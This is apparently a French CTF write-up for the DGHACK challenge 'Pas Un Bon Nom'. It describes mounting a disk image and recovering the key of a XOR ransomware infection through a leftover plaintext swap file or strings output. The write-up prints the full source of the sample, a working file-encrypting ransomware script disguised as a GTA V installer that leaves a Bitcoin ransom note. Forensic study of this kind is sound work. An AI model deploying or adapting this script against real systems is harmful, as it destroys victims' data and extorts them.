# Pas Un Bon Nom

Difficulté : Facile

## Énoncé

> J'étais là tranquillou sur mon PC, m'voyez ? Je télécharge des films et tout, m'voyez ? Et alors il y a ce message étrange que je dois payer Dogecoin pour >  déchiffrer mes données. Je ne l'ai pas fait... donc maintenant mes données sont chiffrées :( Donc tiens, prends le disque dur, c'est pas comme si il était utile maintenant... Sauf si c'était possible de retrouver la clé utilisée par ce méchant hacker, m'voyez ? S'il te plaiiiit ? Tu serais adorable merci !

## Solve

Monter le vmdk :

```shell
sudo modprobe nbd
sudo qemu-nbd -r -c /dev/nbd1 ./PC-jeanne-disk002.vmdk
mount -o ro,noload /dev/nbd1p1 /mnt/tmp
```

### Solve 1

On a un fichier qui nous permet de savoir le type de chiffrement (ici du XOR) :

```shell
cat home/jeanne/GTA_V_installer.py

#!/bin/python3

import os
import fileinput
import sys

main_folder = "./"

def encryptDecrypt(inpDataBytes):

    # Define XOR key
    keyLength = len(xorKey)
 
    # calculate length of input string
    length = len(inpDataBytes)
 
    # perform XOR operation of key
    # with every byte
    for i in range(length):
        inpDataBytes[i] = inpDataBytes[i] ^ ord(xorKey[i % keyLength])

    return inpDataBytes

if __name__ == '__main__':
    # list all the files in the main folder, and its subfolders
    #list_of_files = [main_folder + f for f in os.listdir(main_folder) if os.path.isfile(main_folder + f) and not f.startswith('.')]
    list_of_files = []
    for root, dirs, files in os.walk(main_folder):
        for file in files:
            if not '/.' in os.path.join(root, file):
                # get the file name
                list_of_files.append(os.path.join(root, file))
    print(list_of_files)
    print("\n")

    xorKey = input("Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: ")

    for file in list_of_files:
        if "GTA_V_installer.py" not in file:
            with open(file, 'rb') as f:
                data = bytearray(f.read())
                print("data : " + str(data) + "\n")
                encrypted_data = encryptDecrypt(data)
                print("encrypted : " + str(encrypted_data) + "\n")
            with open(file, 'wb') as f:
                f.write(encrypted_data)

    # Create a READ_TO_RETRIEVE_YOUR_DATA.txt file
    with open(main_folder + "READ_TO_RETRIEVE_YOUR_DATA.txt", 'w') as f:
        f.write("Your PC is now encrypted.\nThe only way you may retrieve your data is by sending 1000 Bitcoins to the following address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n")
        f.write("Add a message to the Bitcoin transfer with your email address.\nThe code to decrypt your data will be sent automatically to this email.\n")
        f.write("Once you get this code, simply run \"python GTA_V_installer.py\" and input your code.\n")
        f.write("I'm very sorry for the inconvenience. I need to feed my family.\n")
        f.write("HODL.\n")

    # I replace the line where the key is defined, that way I can use the same script for decryption without leaving any trace of the key
    is_edited = False
    for line in fileinput.input("./GTA_V_installer.py", inplace=1):
        if "xorKey = " in line and not is_edited:
            line = "    xorKey = input(\"Enter the key you received after following the instructions in READ_TO_RETRIEVE_YOUR_DATA.txt: \")\n"
            is_edited = True
        sys.stdout.write(line)
```

L'objectif va donc d'être de retrouver la clé pour déchiffrer.

Après avoir regarder dans les logs, le bash_history, etc... On trouve rien de spécial nous permettant de déchiffrer les documents.

Cependant, si on regarde dans les documents :

```shell
ls -al home/jeanne/Documents/
total 72
drwxr-xr-x  2 zarkyo zarkyo  4096 14 oct.  12:29 .
drwxr-x--- 13 zarkyo zarkyo  4096 14 oct.  12:31 ..
-rw-rw-r--  1 zarkyo zarkyo  1116 14 oct.  12:31 2019_Q1_report.txt
-rw-rw-r--  1 zarkyo zarkyo   994 14 oct.  12:31 2019_Q2_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1011 14 oct.  12:31 2019_Q3_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1260 14 oct.  12:31 2019_Q4_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1343 14 oct.  12:31 2020_Q1_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1264 14 oct.  12:31 2020_Q2_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1265 14 oct.  12:31 2020_Q3_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1347 14 oct.  12:31 2020_Q4_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1468 14 oct.  12:31 2021_Q1_report.txt
-rw-r--r--  1 zarkyo zarkyo 12288 14 oct.  12:29 .2021_Q1_report.txt.swp
-rw-rw-r--  1 zarkyo zarkyo  1289 14 oct.  12:31 2021_Q2_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1407 14 oct.  12:31 2021_Q3_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1447 14 oct.  12:31 2021_Q4_report.txt
-rw-rw-r--  1 zarkyo zarkyo  1434 14 oct.  12:31 2022_Q1_report.txt
```

On remarque le fichier caché `.2021_Q1_report.txt.swp` qui lui n'est pas chiffré. On a également sa version chiffré `2021_Q1_report.txt`

Pour obtenir la clé, il suffit de `cipher XOR plain`

On va prendre notre fichier chiffré, le transformer en **hexa** (Cyberchef), puis dans **dcode** on fournit notre hexa obtenu à l'instant ainsi que cette clé ASCII : `In Q1, we achieved our highest ever vehicle production and deliveries. This was in s`

on obtient au début de notre résultat de la base64

```shell
echo 'REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=' | base64 -d
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
```

Demonter le disque :

```shell
umount mnt tmp
qemu-nbd -r -d /dev/nbd1
```

### Solve 2

```shell
strings * | grep -ari "xor" | more
[...]
n\n    xorKey = \"REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=\"\n\n    for file in list_of_files:\n        if \"GTA_V_installer.py\" not in file:\n            with open(file, 'rb') as f:\n        
[...]
```

La clé au format base64 nous apparait au début du résultat

```shell
echo 'REdIQUNLezdIMTVfMVNfN0gzX0szWV9HMVYzTl83MF83SDNfR1RBX1ZfUjRONTBNVzRSM19WMUM3MU01fQo=' | base64 -d
DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}
```

**Flag : DGHACK{7H15_1S_7H3_K3Y_G1V3N_70_7H3_GTA_V_R4N50MW4R3_V1C71M5}**